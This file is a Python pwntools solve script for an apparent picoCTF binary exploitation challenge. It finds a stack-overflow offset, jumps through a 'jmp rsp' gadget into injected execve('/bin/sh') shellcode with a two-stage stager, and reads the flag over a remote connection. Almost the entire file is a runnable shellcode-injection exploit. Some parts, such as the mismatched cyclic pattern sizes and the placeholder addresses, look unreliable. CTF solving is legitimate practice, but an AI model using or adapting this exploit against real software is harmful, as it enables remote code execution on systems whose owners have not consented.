#!/usr/bin/env python3
"""
offset-cycleV2 - picoCTF 2026
Category: Binary Exploitation | Points: 400

Exploit: Buffer overflow with shellcode execution.
V2 has no win function, but NX is disabled so the stack is executable.
We use a cyclic pattern to find the offset, a jmp rsp gadget to
redirect execution, and a two-stage shellcode approach.

Usage:
    python3 solve.py [REMOTE]
    python3 solve.py              # run locally against ./vuln
    python3 solve.py REMOTE       # run against the remote server
"""

from pwn import *
import sys

# ============================================================
# CONFIGURATION - Update these values for your instance
# ============================================================
BINARY = "./vuln"
REMOTE_HOST = "rescued-float.picoctf.net"  # Update with actual host
REMOTE_PORT = 54321                         # Update with actual port

# Offset from buffer start to saved RIP (found via cyclic pattern)
# Adjust this if the exploit doesn't work -- try values 20-32
OFFSET = 24

# Address of a 'jmp rsp' gadget (find with: ROPgadget --binary vuln | grep "jmp rsp")
# Since PIE is disabled, this address is fixed. Update for your binary.
JMP_RSP_ADDR = 0x40101a  # Placeholder -- update after running ROPgadget

# ============================================================
# HELPERS
# ============================================================

def find_offset_auto():
    """Automatically find the offset using cyclic pattern and core dump."""
    log.info("Finding offset automatically via cyclic pattern...")
    try:
        r = process(BINARY)
        r.sendline(cyclic(200, n=8))
        r.wait()
        core = Corefile(r.corefile.path)
        off = cyclic_find(core.fault_addr & 0xffffffff, n=4)
        if off == -1:
            # Try 8-byte pattern for 64-bit
            off = cyclic_find(core.read(core.rsp, 4), n=4)
        log.success(f"Found offset: {off}")
        return off
    except Exception as e:
        log.warning(f"Auto offset detection failed: {e}")
        log.info(f"Using default offset: {OFFSET}")
        return OFFSET


def find_jmp_rsp(elf):
    """Search for a jmp rsp gadget in the binary."""
    # jmp rsp = ff e4
    jmp_rsp_bytes = b"\xff\xe4"
    addr = next(elf.search(jmp_rsp_bytes), None)
    if addr:
        log.success(f"Found 'jmp rsp' gadget at: {hex(addr)}")
        return addr

    # Try call rax = ff d0
    call_rax_bytes = b"\xff\xd0"
    addr = next(elf.search(call_rax_bytes), None)
    if addr:
        log.success(f"Found 'call rax' gadget at: {hex(addr)}")
        return addr

    log.warning("No jmp rsp / call rax gadget found, using configured address")
    return JMP_RSP_ADDR


def start(argv=[], *a, **kw):
    """Start the exploit target (local or remote)."""
    if args.REMOTE or "REMOTE" in sys.argv:
        return remote(REMOTE_HOST, REMOTE_PORT)
    else:
        return process([BINARY] + argv, *a, **kw)


# ============================================================
# EXPLOIT
# ============================================================

def exploit():
    context.update(arch="amd64", os="linux", log_level="info")

    # Load the binary if it exists locally
    try:
        elf = ELF(BINARY, checksec=True)
        context.binary = elf
        gadget_addr = find_jmp_rsp(elf)
    except Exception:
        log.warning(f"Could not load {BINARY}, using configured addresses")
        gadget_addr = JMP_RSP_ADDR

    offset = OFFSET

    # Main shellcode: execve("/bin/sh", NULL, NULL)
    shellcode = asm(shellcraft.sh())
    log.info(f"Shellcode size: {len(shellcode)} bytes")

    # Stager: small trampoline that jumps back to our main shellcode
    # This goes right after the overwritten return address on the stack.
    # When jmp rsp executes, it lands here.
    stager = asm("""
        nop
        sub rsp, 0x300
        jmp rsp
    """)
    log.info(f"Stager size: {len(stager)} bytes")

    # --- Connect to the target ---
    io = start()

    # -------------------------------------------------------
    # Strategy A: Two-input approach (message + feedback)
    # If the binary has two input prompts, put shellcode in
    # the first and the overflow + stager in the second.
    # -------------------------------------------------------
    try:
        # First input: main shellcode (NOP sled + shellcode)
        nop_sled = asm("nop") * 64
        payload1 = nop_sled + shellcode

        # Try to detect if there's a prompt
        data = io.recvuntil(b":", timeout=2)
        log.info(f"Received prompt: {data}")
        io.sendline(payload1)

        # Second input: overflow to overwrite RIP
        data = io.recvuntil(b":", timeout=2)
        log.info(f"Received prompt: {data}")

        # padding + jmp_rsp gadget + stager
        payload2 = b"A" * offset + p64(gadget_addr) + stager
        io.sendline(payload2)

    except EOFError:
        log.warning("Two-input approach failed, trying single-input approach...")
        io.close()
        io = start()

        # -------------------------------------------------------
        # Strategy B: Single-input approach
        # Shellcode sits right after the gadget address on the stack.
        # jmp rsp lands on our shellcode directly.
        # -------------------------------------------------------
        data = io.recvuntil(b":", timeout=2)

        payload = b"\x90" * offset + p64(gadget_addr) + shellcode
        io.sendline(payload)

    # --- Interact with the shell ---
    log.success("Exploit sent! Attempting to get flag...")

    try:
        # Try to automatically read the flag
        io.sendline(b"cat flag.txt")
        flag_output = io.recvline(timeout=3)
        if b"picoCTF" in flag_output:
            log.success(f"FLAG: {flag_output.decode().strip()}")
    except Exception:
        pass

    # Drop into interactive mode for manual exploration
    io.interactive()


if __name__ == "__main__":
    exploit()
